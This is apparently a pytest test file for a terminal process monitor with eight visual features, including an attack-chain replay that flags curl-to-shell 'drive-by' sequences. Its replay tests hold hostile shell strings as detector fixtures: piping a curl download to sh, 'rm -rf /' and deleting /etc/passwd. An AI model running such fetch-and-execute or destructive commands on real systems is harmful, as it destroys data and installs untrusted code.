"""Tests for the eight new visually-spectacular features.

Each section corresponds to one feature so test failures are easy to
attribute. The shared `monitor` fixture lives in conftest.py.

Features:
  1. Process Event Ripples  — colored row pulse on CPU/net/disk spikes
  2. AI Narrator           — auto-generated voiceover for anomalous PIDs
  3. Resource Oscilloscope — Braille waveforms for one PID, all metrics
  4. Three-Model Consensus Race — streamed parallel LLM lanes
  5. Attack Chain Replay   — scrubbable event playback
  6. Network Orbit         — animated remote-endpoint constellation
  7. Process Galaxy        — force-directed process-tree graph
  8. Process Lifecycle DVR — Gantt-style PID timeline
"""
from __future__ import annotations

import os
import sys
import time
import threading
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import procmon


# ── 1. Process Event Ripples ──────────────────────────────────────────


def _proc(pid, cpu=0.0, net_in=0, net_out=0, disk_in=0, disk_out=0):
    return {
        "pid": pid, "cpu": cpu,
        "net_in": net_in, "net_out": net_out,
        "disk_in": disk_in, "disk_out": disk_out,
    }


class TestRowPulses:
    def test_no_pulse_on_first_tick(self, monitor):
        # First tick has no prior snapshot, so no pulse can be armed.
        monitor._update_row_pulses([_proc(1, cpu=80.0)])
        assert 1 not in monitor._row_pulses

    def test_cpu_spike_triggers_salmon_pulse(self, monitor):
        monitor._update_row_pulses([_proc(1, cpu=2.0)])
        monitor._update_row_pulses([_proc(1, cpu=80.0)])
        assert 1 in monitor._row_pulses
        color_pair_id, frames = monitor._row_pulses[1]
        assert color_pair_id == 12  # salmon = CPU spike
        assert frames == monitor._pulse_frames

    def test_net_burst_triggers_light_green_pulse(self, monitor):
        monitor._update_row_pulses([_proc(1, net_in=0, net_out=0)])
        # 2 MB/s spike — well above 1 MB/s threshold
        monitor._update_row_pulses(
            [_proc(1, net_in=2 * 1024 * 1024, net_out=0)])
        assert 1 in monitor._row_pulses
        color_pair_id, _ = monitor._row_pulses[1]
        assert color_pair_id == 11  # light green

    def test_disk_burst_triggers_pulse(self, monitor):
        monitor._update_row_pulses([_proc(1, disk_in=0)])
        monitor._update_row_pulses([_proc(1, disk_in=10 * 1024 * 1024)])
        assert 1 in monitor._row_pulses
        color_pair_id, _ = monitor._row_pulses[1]
        assert color_pair_id == 11

    def test_pulse_decays_each_tick(self, monitor):
        monitor._update_row_pulses([_proc(1, cpu=2.0)])
        monitor._update_row_pulses([_proc(1, cpu=80.0)])
        start_frames = monitor._row_pulses[1][1]
        # Successive non-spiking ticks should decay until the entry is gone.
        for _ in range(start_frames + 1):
            monitor._update_row_pulses([_proc(1, cpu=80.0)])
        assert 1 not in monitor._row_pulses

    def test_pulse_attr_returns_zero_when_no_pulse(self, monitor):
        assert monitor._row_pulse_attr(999) == 0

    def test_pulse_attr_returns_nonzero_when_armed(self, monitor):
        monitor._row_pulses[42] = (12, 3)
        with patch.object(procmon.curses, "color_pair", return_value=0x100):
            with patch.object(procmon.curses, "A_BOLD", 0x200):
                attr = monitor._row_pulse_attr(42)
        assert attr != 0

    def test_dead_pids_dropped_from_pulses(self, monitor):
        monitor._update_row_pulses([_proc(1, cpu=2.0)])
        monitor._update_row_pulses([_proc(1, cpu=80.0)])
        assert 1 in monitor._row_pulses
        # Process 1 disappears — pulse should be dropped immediately.
        monitor._update_row_pulses([_proc(2, cpu=2.0)])
        assert 1 not in monitor._row_pulses


# ── 2. AI Narrator / Guided Spotlight ─────────────────────────────────


def _row(pid, cmd="proc", cpu=0.0, rss_kb=0, threads=1,
          ppid=1, net_in=0, net_out=0):
    return {
        "pid": pid, "ppid": ppid, "cpu": cpu, "agg_cpu": cpu,
        "rss_kb": rss_kb, "agg_rss_kb": rss_kb, "threads": threads,
        "agg_threads": threads, "fds": 0, "forks": 0,
        "net_in": net_in, "net_out": net_out,
        "agg_net_in": net_in, "agg_net_out": net_out,
        "bytes_in": 0, "bytes_out": 0,
        "agg_bytes_in": 0, "agg_bytes_out": 0,
        "command": cmd, "depth": 0, "prefix": "",
        "has_children": False, "is_collapsed": False,
    }


class TestNarrator:
    def test_toggle_on_off(self, monitor):
        assert monitor._narrator_enabled is False
        monitor._toggle_narrator_mode()
        assert monitor._narrator_enabled is True
        monitor._toggle_narrator_mode()
        assert monitor._narrator_enabled is False

    def test_anomaly_score_prefers_high_cpu(self, monitor):
        idle = _row(1, cpu=0.5, rss_kb=10 * 1024)
        busy = _row(2, cpu=85.0, rss_kb=10 * 1024)
        assert (monitor._narrator_anomaly_score(busy)
                > monitor._narrator_anomaly_score(idle))

    def test_select_target_returns_none_for_idle_rows(self, monitor):
        # No pulse, no novelty bonus past 60s — recently-seen quiet rows
        # should NOT trigger narration.
        monitor.rows = [_row(1, cpu=0.0)]
        # Mark pid 1 as seen recently so the novelty bonus is gone.
        monitor._narrator_seen_pids[1] = time.monotonic()
        assert monitor._select_narrator_target() is None

    def test_select_target_returns_busy_row(self, monitor):
        monitor.rows = [
            _row(1, cmd="idle", cpu=0.0),
            _row(2, cmd="busy", cpu=90.0, rss_kb=4 * 1024 * 1024),
        ]
        target = monitor._select_narrator_target()
        assert target is not None
        assert target["pid"] == 2

    def test_maybe_run_narrator_only_when_enabled(self, monitor):
        monitor.rows = [_row(2, cpu=90.0)]
        monitor._narrator_enabled = False
        monitor._maybe_run_narrator()
        assert monitor._narrator_loading is False
        assert monitor._narrator_target_pid is None

    def test_maybe_run_narrator_fires_caption_when_enabled(self, monitor):
        monitor.rows = [_row(7, cmd="suspicious", cpu=90.0,
                              rss_kb=4 * 1024 * 1024)]
        monitor._narrator_enabled = True
        monitor._narrator_last_tick = 0.0
        # Belt-and-suspenders: enable test_mode AND patch the caption
        # generator so even if the worker thread out-races the
        # context-manager exit it doesn't shell out for real.
        monitor._test_mode = True
        with patch.object(monitor, "_narrator_generate_caption",
                           return_value="PID 7 is spiking."):
            monitor._maybe_run_narrator()
            worker = monitor._narrator_worker
            if worker is not None:
                worker.join(timeout=5.0)
        assert monitor._narrator_target_pid == 7
        assert monitor._narrator_pending == "PID 7 is spiking."

    def test_speak_only_when_speak_flag_true(self, monitor):
        monitor._narrator_enabled = True
        monitor._narrator_speak = False
        monitor._narrator_pending = "Hello world"
        with patch.object(monitor, "_narrator_speak_async") as spk:
            monitor._poll_narrator_result()
        spk.assert_not_called()

    def test_speak_called_when_flag_true(self, monitor):
        monitor._narrator_enabled = True
        monitor._narrator_speak = True
        monitor._narrator_pending = "Hello world"
        monitor._narrator_target_pid = 1
        with patch.object(monitor, "_narrator_speak_async") as spk:
            monitor._poll_narrator_result()
        spk.assert_called_once()

    def test_speak_async_invokes_say_subprocess(self, monitor):
        with patch("subprocess.Popen") as popen:
            with patch("shutil.which", return_value="/usr/bin/say"):
                monitor._narrator_speak_async("hi there")
                # Spawned in a daemon thread; give it a moment.
                for _ in range(50):
                    if popen.called:
                        break
                    time.sleep(0.02)
        assert popen.called
        argv = popen.call_args[0][0]
        assert argv[0] == "/usr/bin/say"
        assert "hi there" in argv

    def test_speak_async_skips_when_say_missing(self, monitor):
        with patch("shutil.which", return_value=None):
            with patch("subprocess.Popen") as popen:
                monitor._narrator_speak_async("hi there")
                time.sleep(0.05)
                popen.assert_not_called()

    def test_history_capped(self, monitor):
        monitor._narrator_enabled = True
        monitor._narrator_history_max = 3
        for i in range(10):
            monitor._narrator_target_pid = i
            monitor._narrator_pending = f"caption{i}"
            with patch.object(monitor, "_narrator_speak_async"):
                monitor._poll_narrator_result()
        assert len(monitor._narrator_history) == 3


# ── 3. Resource Oscilloscope ──────────────────────────────────────────


class TestOscilloscope:
    def test_braille_waveform_basic(self):
        rows = procmon._braille_waveform([0, 1, 2, 3, 4, 5, 6, 7],
                                         width=4, height=4)
        assert len(rows) == 4
        for r in rows:
            assert len(r) == 4
        # All glyphs in the Braille block 0x2800–0x28FF
        for r in rows:
            for ch in r:
                assert 0x2800 <= ord(ch) <= 0x28FF

    def test_braille_waveform_zero_input_blank(self):
        rows = procmon._braille_waveform([0, 0, 0, 0], width=4, height=2)
        assert len(rows) == 2
        # All zero → blank row of spaces
        for r in rows:
            assert r == "    "

    def test_braille_waveform_empty_input(self):
        rows = procmon._braille_waveform([], width=10, height=3)
        assert len(rows) == 3
        for r in rows:
            assert r == "          "

    def test_braille_waveform_zero_width(self):
        rows = procmon._braille_waveform([1, 2, 3], width=0, height=4)
        assert all(r == "" for r in rows)

    def test_toggle_mode_on_off(self, monitor):
        monitor.rows = [_row(42, cmd="busy")]
        monitor.selected = 0
        assert monitor._oscilloscope_mode is False
        monitor._toggle_oscilloscope_mode()
        assert monitor._oscilloscope_mode is True
        assert monitor._oscilloscope_pid == 42
        monitor._toggle_oscilloscope_mode()
        assert monitor._oscilloscope_mode is False
        assert monitor._oscilloscope_pid is None

    def test_toggle_disables_other_modes(self, monitor):
        monitor.rows = [_row(42)]
        monitor.selected = 0
        monitor._inspect_mode = True
        monitor._net_mode = True
        monitor._toggle_oscilloscope_mode()
        assert monitor._inspect_mode is False
        assert monitor._net_mode is False

    def test_build_oscilloscope_lines_renders_braille(self, monitor):
        import collections as _c
        monitor._metric_history[7] = {
            "cpu": _c.deque([0.0, 5.0, 10.0, 15.0], maxlen=60),
            "rss_kb": _c.deque([0.0, 1024.0], maxlen=60),
        }
        lines = monitor._build_oscilloscope_lines(7, width=80)
        # Find at least one line containing a Braille glyph
        joined = "\n".join(lines)
        assert any(0x2800 <= ord(ch) <= 0x28FF for ch in joined)
        assert "CPU %" in joined
        assert "RSS MB" in joined

    def test_oscilloscope_lanes_cover_all_metrics(self, monitor):
        labels = [lane[1] for lane in
                   procmon.ProcMonUI._OSCILLOSCOPE_LANES]
        for needed in ("CPU %", "RSS MB", "Net IN B/s", "Net OUT B/s",
                       "Disk R B/s", "Disk W B/s", "GPU %", "FDs",
                       "Mach ports"):
            assert needed in labels


# ── 4. Three-Model Consensus Race ─────────────────────────────────────


class TestConsensusRace:
    def test_lane_state_init(self, monitor):
        assert set(monitor._consensus_lanes.keys()) == {
            "claude", "codex", "gemini"}
        assert monitor._consensus_running is False
        assert monitor._consensus_risk_bar == 0

    def test_run_llms_parallel_streaming_resets_lanes(self, monitor):
        monitor._consensus_lanes = {"claude": ["stale"], "codex": ["stale"],
                                     "gemini": ["stale"]}
        # Replace streaming runner with a fake that emits one line then quits.
        def fake_stream(tool, prompt, input_text, on_chunk):
            on_chunk(tool, f"first line from {tool}")
            on_chunk(tool, f"RISK: HIGH from {tool}")
            return f"DONE {tool}"
        monitor._build_analysis_input = lambda artifacts: "x"
        with patch.object(monitor, "_run_llm_streaming",
                           side_effect=fake_stream):
            results = monitor._run_llms_parallel_streaming(
                {"pid": 1, "exe_path": "/bin/x"})
        assert set(results.keys()) == {"claude", "codex", "gemini"}
        # Lane state populated for each tool
        for tool in ("claude", "codex", "gemini"):
            assert any(tool in line for line in monitor._consensus_lanes[tool])
        # Risk bar advanced to 100% after all three finish
        assert monitor._consensus_risk_bar == 100
        # done flags all set
        assert all(monitor._consensus_lane_done.values())
        # _consensus_running clears at the end
        assert monitor._consensus_running is False

    def test_legacy_run_llms_parallel_unchanged(self, monitor):
        """The original (non-streaming) path still calls `_run_llm` so the
        old test_inspect_hidden coverage doesn't break."""
        with patch.object(monitor, "_build_analysis_input",
                           return_value="x"):
            with patch.object(monitor, "_run_llm",
                               return_value="RISK: LOW") as run_llm:
                results = monitor._run_llms_parallel(
                    {"pid": 1, "exe_path": "/bin/x"})
        assert run_llm.call_count == 3
        assert all("RISK: LOW" in v for v in results.values())

    def test_consensus_race_partial_done_at_one_third(self, monitor):
        monitor._consensus_lane_done = {"claude": True, "codex": False,
                                         "gemini": False}
        finished = sum(1 for v in monitor._consensus_lane_done.values() if v)
        assert finished == 1
        # Simulate the bar update logic
        monitor._consensus_risk_bar = int(finished / 3.0 * 100)
        assert 30 <= monitor._consensus_risk_bar <= 35  # 33%

    def test_build_consensus_race_lines(self, monitor):
        with monitor._consensus_lane_lock:
            monitor._consensus_lanes["claude"] = ["RISK: HIGH",
                                                     "details about claude"]
            monitor._consensus_lanes["codex"] = ["RISK: MEDIUM",
                                                    "details about codex"]
            monitor._consensus_lanes["gemini"] = ["analysis pending"]
            monitor._consensus_lane_done = {"claude": True, "codex": True,
                                              "gemini": False}
        monitor._consensus_risk_bar = 66
        out = monitor._build_consensus_race_lines(width=120)
        joined = "\n".join(out)
        assert "claude" in joined
        assert "codex" in joined
        assert "gemini" in joined
        assert "CONSENSUS_RISK" in joined
        # Divergence (HIGH vs MEDIUM) should be flagged
        assert "DIVERGENCE" in joined

    def test_consensus_no_divergence_when_lanes_agree(self, monitor):
        with monitor._consensus_lane_lock:
            monitor._consensus_lanes["claude"] = ["RISK: HIGH"]
            monitor._consensus_lanes["codex"] = ["RISK: HIGH"]
            monitor._consensus_lanes["gemini"] = ["RISK: HIGH"]
        diverge, levels = monitor._consensus_lane_divergence()
        assert diverge is False
        assert levels == {"HIGH"}

    def test_streaming_collects_lines(self, monitor):
        # Mock subprocess.Popen so _run_llm_streaming sees a fake stdout
        from io import BytesIO
        fake_proc = MagicMock()
        fake_proc.stdout = BytesIO(b"line one\nline two\n")
        fake_proc.stderr = BytesIO(b"")
        fake_proc.stdin = BytesIO()
        fake_proc.returncode = 0
        fake_proc.wait.return_value = 0
        chunks = []

        def fake_popen(*args, **kwargs):
            return fake_proc

        with patch("subprocess.Popen", side_effect=fake_popen):
            text = monitor._run_llm_streaming(
                "claude", "prompt", "input",
                lambda tool, line: chunks.append((tool, line)))
        assert "line one" in text
        assert "line two" in text
        # Two lines should have been chunked
        assert len(chunks) >= 2

    def test_streaming_handles_missing_binary(self, monitor):
        with patch("subprocess.Popen", side_effect=FileNotFoundError):
            chunks = []
            text = monitor._run_llm_streaming(
                "claude", "prompt", "input",
                lambda tool, line: chunks.append(line))
        # Returns the error tag and chunks it
        assert "not found" in text
        assert any("not found" in c for c in chunks)


# ── 5. Attack Chain Replay ────────────────────────────────────────────


def _evt(idx, kind="exec", pid=100, ppid=1, cmd="/bin/x", ts_mono=None):
    return {
        "idx": idx, "kind": kind, "pid": pid, "ppid": ppid,
        "cmd": cmd, "ts": "", "ts_mono": ts_mono if ts_mono is not None
        else float(idx),
    }


class TestReplay:
    def test_driveby_detection_curl_to_bash(self, monitor):
        events = [
            _evt(0, "exec", pid=100, ppid=1, cmd="/usr/bin/curl http://x"),
            _evt(1, "exec", pid=101, ppid=100,
                  cmd="/bin/bash -c 'curl http://x | sh'", ts_mono=1.0),
        ]
        pairs = monitor._detect_driveby_pairs(events)
        assert (100, 101) in pairs

    def test_driveby_window_excludes_late_shells(self, monitor):
        events = [
            _evt(0, "exec", pid=100, ppid=1, cmd="curl example.com",
                  ts_mono=0.0),
            _evt(1, "exec", pid=101, ppid=100,
                  cmd="bash -c 'rm -rf /'", ts_mono=999.0),
        ]
        pairs = monitor._detect_driveby_pairs(events)
        assert (100, 101) not in pairs

    def test_driveby_no_curl_no_pair(self, monitor):
        events = [
            _evt(0, "exec", pid=100, ppid=1,
                  cmd="bash -c echo hello", ts_mono=0.0),
        ]
        pairs = monitor._detect_driveby_pairs(events)
        assert len(pairs) == 0

    def test_start_replay_with_empty_buffer_returns_false(self, monitor):
        monitor._events = []
        assert monitor._start_replay_mode() is False

    def test_start_replay_populates_events_and_pairs(self, monitor):
        monitor._events = [
            _evt(0, "exec", pid=100, cmd="curl http://evil"),
            _evt(1, "exec", pid=101, ppid=100,
                  cmd="sh -c 'rm /etc/passwd'", ts_mono=1.0),
        ]
        ok = monitor._start_replay_mode()
        assert ok is True
        assert monitor._replay_mode is True
        assert len(monitor._replay_events) == 2
        assert (100, 101) in monitor._replay_driveby_pairs

    def test_replay_step_clamps_bounds(self, monitor):
        monitor._replay_events = [_evt(0), _evt(1), _evt(2)]
        monitor._replay_cursor = 0
        monitor._replay_step(-5)
        assert monitor._replay_cursor == 0
        monitor._replay_step(5)
        assert monitor._replay_cursor == 2

    def test_replay_advance_when_playing(self, monitor):
        monitor._replay_events = [_evt(i) for i in range(5)]
        monitor._replay_mode = True
        monitor._replay_playing = True
        monitor._replay_cursor = 0
        changed = monitor._replay_advance_if_playing()
        assert changed is True
        assert monitor._replay_cursor == 1

    def test_replay_advance_stops_at_end(self, monitor):
        monitor._replay_events = [_evt(0), _evt(1)]
        monitor._replay_mode = True
        monitor._replay_playing = True
        monitor._replay_cursor = 1
        monitor._replay_advance_if_playing()
        assert monitor._replay_playing is False

    def test_replay_format_view_renders_current_event(self, monitor):
        monitor._replay_events = [
            _evt(0, "exec", pid=42, ppid=1,
                  cmd="/usr/bin/something --weird")
        ]
        monitor._replay_cursor = 0
        out = monitor._format_replay_view(width=80)
        joined = "\n".join(out)
        assert "pid=42" in joined
        assert "something" in joined

    def test_replay_format_view_shows_driveby_warning(self, monitor):
        monitor._replay_events = [
            _evt(0, "exec", pid=100, cmd="curl x")
        ]
        monitor._replay_cursor = 0
        monitor._replay_driveby_pairs = {(100, 101)}
        out = monitor._format_replay_view(width=80)
        joined = "\n".join(out)
        assert "drive-by" in joined.lower()

    def test_events_persist_buffer_on_close(self, monitor):
        monitor._events_mode = True
        monitor._events_persist_on_close = True
        monitor._events = [
            _evt(0, "exec", pid=100, cmd="curl"),
            _evt(1, "exec", pid=101, ppid=100, cmd="bash -c rm",
                  ts_mono=1.0),
        ]
        # Stub the stream stopper since the test runs under a fixture
        # without a live stream.
        monitor._stop_events_stream = lambda: None
        monitor._toggle_events_mode()
        assert monitor._events_mode is False
        assert len(monitor._replay_events) == 2
        assert (100, 101) in monitor._replay_driveby_pairs


# ── 6. Network Orbit / Constellation ──────────────────────────────────


class TestNetworkOrbit:
    def test_layout_n_remotes_returns_n_positions(self, monitor):
        positions = monitor._orbit_layout(8, (40, 10), 5)
        assert len(positions) == 8
        # Spread roughly around (40, 10)
        xs = [p[0] for p in positions]
        ys = [p[1] for p in positions]
        assert min(xs) < 40 < max(xs)
        assert min(ys) < 10 < max(ys)

    def test_layout_zero_returns_empty(self, monitor):
        assert monitor._orbit_layout(0, (10, 5), 3) == []

    def test_particle_position_wraps(self, monitor):
        # Distance 10 → particle wraps every 10 ticks.
        first = monitor._orbit_particle_position((0, 0), (10, 0), 0)
        ten = monitor._orbit_particle_position((0, 0), (10, 0), 10)
        assert first == ten

    def test_particle_position_at_midpoint(self, monitor):
        x, y = monitor._orbit_particle_position((0, 0), (10, 0), 5)
        assert x == 5
        assert y == 0

    def test_edge_color_https(self, monitor):
        assert monitor._orbit_edge_color("TCP", "https") == 9

    def test_edge_color_ssh(self, monitor):
        assert monitor._orbit_edge_color("TCP", "ssh") == 7

    def test_edge_color_udp_default_magenta(self, monitor):
        assert monitor._orbit_edge_color("UDP", "") == 8

    def test_toggle_only_when_net_mode_active(self, monitor):
        monitor._net_mode = False
        monitor._toggle_orbit_mode()
        assert monitor._orbit_mode is False
        monitor._net_mode = True
        monitor._toggle_orbit_mode()
        assert monitor._orbit_mode is True

    def test_build_orbit_lines_renders_endpoints(self, monitor):
        monitor._net_pid = 42
        monitor._net_entries = [
            {"pid": 42, "fd": "5", "proto": "TCP", "service": "https",
             "org": "Cloudflare", "addr_key": "1.2.3.4:50000->5.6.7.8:443",
             "bytes_in": 100, "bytes_out": 200, "bytes_total": 300,
             "display": "x"},
            {"pid": 42, "fd": "6", "proto": "TCP", "service": "ssh",
             "org": "Github", "addr_key": "1.2.3.4:50001->22.22.22.22:22",
             "bytes_in": 0, "bytes_out": 0, "bytes_total": 0,
             "display": "x"},
        ]
        lines = monitor._build_orbit_lines(w=80, h=24)
        joined = "\n".join(lines)
        # Center label
        assert "PID 42" in joined
        # At least one orbit endpoint glyph
        assert "○" in joined
        # Org name visible
        assert "Cloudflare" in joined or "Github" in joined

    def test_build_orbit_lines_no_country_or_city(self, monitor):
        # We must not surface country/city in orbit labels.
        monitor._net_pid = 42
        monitor._net_entries = [{
            "pid": 42, "fd": "1", "proto": "TCP", "service": "https",
            "org": "Cloudflare",
            "addr_key": "1.2.3.4:5000->5.6.7.8:443",
            "bytes_in": 0, "bytes_out": 0, "bytes_total": 0,
            "display": "",
        }]
        lines = monitor._build_orbit_lines(w=80, h=24)
        joined = "\n".join(lines)
        # No 2-letter country code in our layout — only org names.
        assert "[US]" not in joined
        assert "California" not in joined


# ── 7. Process Galaxy ─────────────────────────────────────────────────


class TestProcessGalaxy:
    def _make_rows(self, n):
        rows = []
        for i in range(n):
            rows.append({
                "pid": i + 1,
                "ppid": (i // 4) + 1,  # rough tree shape
                "cpu": float(i % 10),
                "agg_cpu": float(i % 10),
                "rss_kb": 0,
                "agg_rss_kb": 0,
                "command": f"proc{i}",
            })
        return rows

    def test_node_cap_respected(self, monitor):
        monitor.rows = self._make_rows(200)
        monitor._galaxy_node_cap = 80
        nodes = monitor._galaxy_select_nodes()
        assert len(nodes) == 80

    def test_galaxy_step_initializes_positions(self, monitor):
        monitor.rows = self._make_rows(10)
        monitor._galaxy_step(60, 20)
        assert len(monitor._galaxy_positions) == 10
        # All positions are finite numbers within bounds
        for x, y in monitor._galaxy_positions.values():
            assert isinstance(x, float)
            assert isinstance(y, float)
            assert 0.0 <= x <= 60.0
            assert 0.0 <= y <= 20.0

    def test_galaxy_step_no_nan(self, monitor):
        import math
        monitor.rows = self._make_rows(20)
        for _ in range(5):
            monitor._galaxy_step(80, 24)
        for x, y in monitor._galaxy_positions.values():
            assert not math.isnan(x)
            assert not math.isnan(y)

    def test_new_pid_glow_set(self, monitor):
        monitor.rows = self._make_rows(3)
        monitor._galaxy_step(60, 20)
        assert all(monitor._galaxy_glow.get(r["pid"]) is not None
                    for r in monitor.rows)

    def test_glow_decays(self, monitor):
        monitor.rows = self._make_rows(3)
        monitor._galaxy_step(60, 20)
        first = dict(monitor._galaxy_glow)
        monitor._galaxy_step(60, 20)
        # Glow values must not increase between ticks for the same pid set
        for pid, start_val in first.items():
            assert monitor._galaxy_glow.get(pid, 0) <= start_val

    def test_dropped_pid_removed_from_state(self, monitor):
        monitor.rows = self._make_rows(5)
        monitor._galaxy_step(60, 20)
        # Drop pid 3
        monitor.rows = [r for r in monitor.rows if r["pid"] != 3]
        monitor._galaxy_step(60, 20)
        assert 3 not in monitor._galaxy_positions

    def test_toggle_resets_state(self, monitor):
        monitor.rows = self._make_rows(5)
        monitor._galaxy_step(60, 20)
        assert monitor._galaxy_positions
        monitor._toggle_galaxy_mode()  # turn ON (was off)
        # Toggle off resets
        monitor._toggle_galaxy_mode()
        assert monitor._galaxy_mode is False

    def test_build_galaxy_lines_returns_grid(self, monitor):
        monitor.rows = self._make_rows(5)
        lines = monitor._build_galaxy_lines(80, 24)
        # Bound height is h - 6 = 18
        assert len(lines) == 18
        # All same width
        assert len({len(l) for l in lines}) == 1


# ── 8. Process Lifecycle DVR ──────────────────────────────────────────


class TestLifecycleDVR:
    def test_capture_snapshot_appends(self, monitor):
        monitor._capture_lifecycle_snapshot([
            {"pid": 1, "command": "/bin/init"},
            {"pid": 2, "command": "/bin/x"},
        ])
        assert len(monitor._lifecycle_snapshots) == 1
        ts, pids, meta = monitor._lifecycle_snapshots[0]
        assert pids == {1, 2}
        assert meta[1] == "init"

    def test_ring_buffer_truncates(self, monitor):
        # Drop the buffer to a tiny one so the test is fast.
        import collections
        monitor._lifecycle_snapshots = collections.deque(maxlen=5)
        for i in range(20):
            monitor._capture_lifecycle_snapshot([{"pid": i, "command": "p"}])
        assert len(monitor._lifecycle_snapshots) == 5

    def test_select_pids_filters_by_alive_count(self, monitor):
        snapshots = [
            (0, {1, 2}, {1: "a", 2: "b"}),
            (1, {1}, {1: "a"}),
        ]
        monitor._lifecycle_min_alive_cells = 2
        pids = monitor._lifecycle_select_pids(snapshots)
        # pid 1 alive in both; pid 2 alive in one only
        assert pids == [1]

    def test_select_pids_caps_max_rows(self, monitor):
        monitor._lifecycle_max_rows = 3
        snapshots = [(0, {i for i in range(20)},
                       {i: f"p{i}" for i in range(20)})]
        pids = monitor._lifecycle_select_pids(snapshots)
        assert len(pids) == 3

    def test_toggle_mode(self, monitor):
        monitor._toggle_lifecycle_mode()
        assert monitor._lifecycle_mode is True
        monitor._toggle_lifecycle_mode()
        assert monitor._lifecycle_mode is False

    def test_step_freezes_playback(self, monitor):
        monitor._lifecycle_snapshots.extend([
            (0, {1}, {1: "a"}), (1, {1, 2}, {1: "a", 2: "b"})])
        monitor._lifecycle_cursor = -1
        monitor._lifecycle_playing = True
        monitor._lifecycle_step(-1)
        assert monitor._lifecycle_playing is False
        # Cursor frozen somewhere in [0, n-1]
        assert 0 <= monitor._lifecycle_cursor <= 1

    def test_jump_live_resumes_playback(self, monitor):
        monitor._lifecycle_cursor = 5
        monitor._lifecycle_playing = False
        monitor._lifecycle_jump_live()
        assert monitor._lifecycle_cursor == -1
        assert monitor._lifecycle_playing is True

    def test_build_lifecycle_lines_renders_blocks(self, monitor):
        # Three snapshots — pid 1 in all, pid 2 in last two.
        monitor._lifecycle_snapshots.extend([
            (0, {1}, {1: "init"}),
            (1, {1, 2}, {1: "init", 2: "child"}),
            (2, {1, 2}, {1: "init", 2: "child"}),
        ])
        lines = monitor._build_lifecycle_lines(120, 30)
        joined = "\n".join(lines)
        assert "Lifecycle DVR" in joined
        assert "init" in joined
        assert "child" in joined
        # Block glyph somewhere
        assert "█" in joined or "▓" in joined

    def test_build_lifecycle_empty_buffer(self, monitor):
        lines = monitor._build_lifecycle_lines(80, 20)
        joined = "\n".join(lines)
        assert "No lifecycle snapshots" in joined
